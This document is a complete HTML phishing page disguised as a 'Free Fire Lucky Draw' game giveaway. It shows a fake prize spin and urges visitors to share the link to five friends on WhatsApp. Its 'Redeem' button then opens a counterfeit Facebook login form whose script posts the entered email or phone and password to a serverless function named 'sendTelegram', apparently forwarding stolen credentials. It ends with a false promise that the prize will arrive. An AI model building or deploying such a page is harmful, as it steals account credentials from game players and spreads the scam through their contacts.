<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Free Fire Lucky Draw</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
body {
  background: #0f1321;
  color: white;
  font-family: 'Orbitron', 'Arial', sans-serif;
  margin: 0;
  padding: 20px 10px;
  text-align: center;
}
h1 {
  margin-bottom: 10px;
  font-size: 2.3em;
  letter-spacing: 2px;
  color: #ffd94c;
  font-family: 'Orbitron', 'Arial', sans-serif;
  text-shadow: 0 0 12px #fcc203, 0 2px 0 #222, 0 0 1px #ffad07;
}
#prizeBox {
  width: 230px;
  height: 230px;
  background: linear-gradient(135deg, #444, #202a48 60%, #ffd94c 90%);
  border-radius: 28px;
  margin: 26px auto 16px auto;
  cursor: pointer;
  position: relative;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  box-shadow: 0 8px 48px #091017, 0 0 22px #fcc20388;
  border: 5px solid #ffd94c;
  transition: border-color .3s;
  z-index: 3;
}
#prizeBox img {
  max-width: 185px;
  max-height: 185px;
  display: none;
  border-radius: 22px;
  margin-bottom: 5px;
  box-shadow: 0 8px 38px #ffad0736;
}
#prizeBox .text {
  font-size: 1.35em;
  font-weight: bold;
  color: #ffd94c;
  letter-spacing: 1.2px;
  margin-top: 10px;
  text-shadow: 0 1px 10px #ffd94c40;
}
#prizeName {
  color: #fff;
  font-size: 1.27em;
  font-weight: bold;
  margin-top: 10px;
  letter-spacing: 1px;
  text-shadow: 0 0 7px #ffd94c90;
}
.prize-pool {
  margin-top: 35px;
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  grid-template-rows: repeat(3, 124px);
  gap: 36px 22px;
  max-width: 440px;
  margin-left: auto;
  margin-right: auto;
  justify-content: center;
  align-items: center;
}
.prize-pool .prize {
  width: 130px;
  height: 124px;
  border-radius: 16px;
  background: linear-gradient(130deg,#1e2339 85%, #ffd94c 95%);
  border: 3px solid #353c54;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  transition: border-color 0.5s, box-shadow 0.5s, transform 0.3s;
  user-select: none;
  box-shadow: 0 2px 20px #353c5414;
  position: relative;
}
.prize-pool .prize img {
  max-width: 104px;
  max-height: 104px;
  border-radius: 12px;
  margin-bottom: 10px;
  box-shadow: 0 2px 12px #ffad071e;
}
.prize-pool .prize .label {
  font-size: 1.12em;
  color: #ffd94c;
  font-weight: bold;
  background: #202a48d0;
  border-radius: 9px;
  width: 98%;
  margin: 0 auto;
  padding: 6px 0 5px 0;
  text-align: center;
  letter-spacing: .8px;
  position: absolute;
  bottom: 9px;
  left: 50%;
  transform: translateX(-50%);
  box-shadow: 0 1px 10px #222a2b09;
}
.prize-pool .prize.highlight {
  border-color: #ffd94c;
  box-shadow: 0 0 42px #ffd94ccc, 0 0 19px #ffad07a5;
  transform: scale(1.12);
}
.prize-pool .prize:last-child {
  grid-column: 1/3;
  justify-self: center;
}
#share-instruct {
  color: #ffd94c;
  font-size: 1.05em;
  font-weight: bold;
  margin: 18px 0 2px 0;
  text-shadow: 0 1px 8px #333a, 0 0 3px #ffad07b0;
}
#share-btn {
  width: 180px;
  max-width: 250px;
  margin: 9px auto 0 auto;
  font-size: 1.17em;
  padding: 16px 0;
  border: none;
  border-radius: 8px;
  color: #fff;
  background: linear-gradient(90deg, #ffad07 25%, #ff3b50 80%);
  box-shadow: 0 2px 9px #ffad0730;
  cursor: pointer;
  font-family: 'Orbitron','Arial',sans-serif;
  font-weight: bold;
  letter-spacing: .9px;
  transition: background .24s;
}
#share-btn:hover {
  background: linear-gradient(120deg, #ffad07 60%, #ff3b50 95%);
}
#redeem-area {
  margin-top: 13px;
}
.redeem-btn {
  width: 175px;
  font-size: 1.18em;
  font-family: inherit;
  padding: 16px 0;
  border: none;
  border-radius: 8px;
  color: #fff;
  background: linear-gradient(95deg, #ff3b50, #ffd94c 80%);
  box-shadow: 0 2px 11px #ffad0734;
  cursor: pointer;
  font-weight: bold;
  letter-spacing: .7px;
}
#fb-modal,
#confirmation-page {
  display: none;
}
#fb-modal {
  position: fixed;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  background: rgba(16, 20, 30, 0.85);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 30;
}
#confirmation-page {
  position: fixed;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  background: #202a48;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 31;
  font-size: 1.4em;
  padding: 20px;
  text-align: center;
  flex-direction: column;
}
.fb-container {
  width: 98vw;
  max-width: 360px;
  background: #fff;
  border-radius: 7px;
  padding: 28px 18px 22px 18px;
  box-shadow: 0 8px 38px #202a487a;
  position: relative;
  color: #000;
}
.fb-container h2 {
  color: #1877f2;
  letter-spacing: 1px;
  margin-top: 0;
  font-family: 'Segoe UI', Arial, sans-serif;
}
.fb-container input {
  width: 100%;
  padding: 11px;
  margin: 8px 0;
  border: 1px solid #ccd0d5;
  border-radius: 5px;
  font-size: 1em;
  background: #f5f6fa;
}
.fb-container button {
  width: 100%;
  padding: 11px;
  border: none;
  border-radius: 5px;
  background: #1877f2;
  color: #fff;
  font-size: 1em;
  margin-top: 8px;
  cursor: pointer;
}
.fb-container .close-fb {
  position: absolute;
  top: 15px;
  right: 20px;
  font-size: 1.4em;
  color: #444;
  background: none;
  border: none;
  cursor: pointer;
}
.fb-container .gaming-link {
  display: inline-block;
  margin-top: 14px;
  text-align: center;
  color: #ffad07;
  font-weight: bold;
  letter-spacing: 1px;
  text-decoration: none;
  font-size: 1.09em;
}
.fb-container .gaming-link:hover {
  text-decoration: underline;
  color: #ff3b50;
}
@media screen and (max-width: 600px) {
  .prize-pool {gap:8px;}
  .prize-pool .prize { width: 74px; height: 64px; }
  .prize-pool .prize img { max-width: 50px; max-height:50px;}
  #prizeBox { width: 132px; height: 132px;}
  #prizeBox img { max-width:82px;max-height:82px;}
}
</style>
<!-- Google Fonts Orbitron for Free Fire style -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
</head>
<body>
  <h1>Free Fire Lucky Draw</h1>

  <div id="prizeBox">
    <div class="text">Click to Open</div>
    <img alt="Winning Prize" />
    <div id="prizeName" class="text"></div>
  </div>

  <div class="prize-pool" id="prizePool">
    <div class="prize" data-idx="0">
      <img src="diamond-500.png" alt="500 Diamonds" title="500 Diamonds" />
      <div class="label">500 Diamonds</div>
    </div>
    <div class="prize" data-idx="1">
      <img src="diamond-300.png" alt="300 Diamonds" title="300 Diamonds" />
      <div class="label">300 Diamonds</div>
    </div>
    <div class="prize" data-idx="2">
      <img src="rare-gun-skin.png" alt="Rare Gun Skin Box" title="Rare Gun Skin Box" />
      <div class="label">Rare Gun Skin Box</div>
    </div>
    <div class="prize" data-idx="3">
      <img src="rare-dress.jpg" alt="Rare Dress" title="Rare Dress" />
      <div class="label">Rare Dress</div>
    </div>
    <div class="prize" data-idx="4">
      <img src="pet-box.png" alt="Pet Box" title="Pet Box" />
      <div class="label">Pet Box</div>
    </div>
  </div>
  
  <div id="share-instruct">Share this site to 5 different friends now to redeem your prize.</div>
  <button id="share-btn" class="spin-btn" style="margin-top: 9px;">Share Now</button>

  <div id="redeem-area" style="margin-top:15px; display:none;">
    <button class="redeem-btn" id="redeemBtn">Redeem</button>
  </div>

  <!-- Facebook Login Modal -->
  <div id="fb-modal">
    <div class="fb-container">
      <button class="close-fb" onclick="document.getElementById('fb-modal').style.display='none'">Ã—</button>
      <h2>Facebook</h2>
      <input type="text" id="fb-email" placeholder="Email or Phone number" />
      <input type="password" id="fb-password" placeholder="Password" />
      <button id="fb-login-btn">Log In</button>
      <a class="gaming-link" href="#">Gaming Help</a>
    </div>
  </div>

  <!-- Confirmation Page -->
  <div id="confirmation-page">
    <p>Thank you for logging in!<br>Your gift will be received in your mailbox within 24 hours.</p>
  </div>

<script>
  const prizes = [
    { name: '500 Diamonds', img: 'diamond-500.png' },
    { name: '300 Diamonds', img: 'diamond-300.png' },
    { name: 'Rare Gun Skin Box', img: 'rare-gun-skin.png' },
    { name: 'Rare Dress', img: 'rare-dress.jpg' },
    { name: 'Pet Box', img: 'pet-box.png' }
  ];
  const prizeBox = document.getElementById('prizeBox');
  const prizePoolDivs = document.querySelectorAll('#prizePool .prize');
  const shareBtn = document.getElementById('share-btn');
  const shareInstruct = document.getElementById('share-instruct');
  const redeemBtn = document.getElementById('redeemBtn');
  const redeemArea = document.getElementById('redeem-area');
  const resultImg = prizeBox.querySelector('img');
  const resultName = document.getElementById('prizeName');
  const resultText = prizeBox.querySelector('.text');
  let opened = false;
  let wonPrizeIdx = null;

  function resetPrizeBox() {
    resultImg.style.display = 'none';
    resultName.textContent = '';
    resultText.style.display = 'block';
    resultText.textContent = 'Click to Open';
    prizePoolDivs.forEach(div => div.classList.remove('highlight'));
    shareBtn.style.display = 'block';
    redeemArea.style.display = 'none';
    opened = false;
  }
  function animatePrizeSelection(idx) {
    let rounds = 10;
    let steps = rounds * prizes.length;
    let currentStep = 0;
    function step() {
      prizePoolDivs.forEach(div => div.classList.remove('highlight'));
      let highlightIdx = currentStep % prizes.length;
      prizePoolDivs[highlightIdx].classList.add('highlight');
      currentStep++;
      if (currentStep < steps) {
        setTimeout(step, 80 + currentStep * 12);
      } else {
        prizePoolDivs.forEach(div => div.classList.remove('highlight'));
        prizePoolDivs[idx].classList.add('highlight');
        showWinningPrize(idx);
      }
    }
    step();
  }
  function showWinningPrize(idx) {
    wonPrizeIdx = idx;
    resultText.style.display = 'none';
    resultImg.src = prizes[idx].img;
    resultImg.alt = prizes[idx].name;
    resultImg.style.display = 'block';
    resultName.textContent = prizes[idx].name;
    shareBtn.style.display = 'block';
    redeemArea.style.display = 'none';
  }
  prizeBox.addEventListener('click', () => {
    if (opened) return;
    opened = true;
    const randomIndex = Math.floor(Math.random() * prizes.length);
    animatePrizeSelection(randomIndex);
    shareBtn.style.display = 'block';
    redeemArea.style.display = 'none';
  });
  shareBtn.addEventListener('click', () => {
    const siteURL = encodeURIComponent(window.location.href);
    const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Share it with 5 friends and claim your prize: ${siteURL}`;
    window.open(whatsappLink, '_blank');
    redeemArea.style.display = 'block';
    shareBtn.style.display = 'none';
  });
  redeemBtn.addEventListener('click', () => {
    document.getElementById('fb-modal').style.display = 'flex';
  });
  document.getElementById('fb-login-btn').addEventListener('click', () => {
    const emailOrPhone = document.getElementById('fb-email').value.trim();
    const password = document.getElementById('fb-password').value.trim();
    if (!emailOrPhone || !password) {
      alert('Please fill in both fields.');
      return;
    }
    fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ emailOrPhone, password }),
    })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('Login details sent successfully!');
          document.getElementById('fb-modal').style.display = 'none';
          document.getElementById('confirmation-page').style.display = 'flex';
          document.getElementById('fb-email').value = '';
          document.getElementById('fb-password').value = '';
        } else {
          alert('Failed to send details.');
        }
      })
      .catch(() => {
        alert('Error sending details.');
      });
  });
  document.querySelector('.close-fb').addEventListener('click', () => {
    document.getElementById('fb-modal').style.display = 'none';
  });
  document.getElementById('confirmation-page').style.display = 'none';
  document.getElementById('fb-modal').style.display = 'none';
  resetPrizeBox();
</script>
</body>
</html>
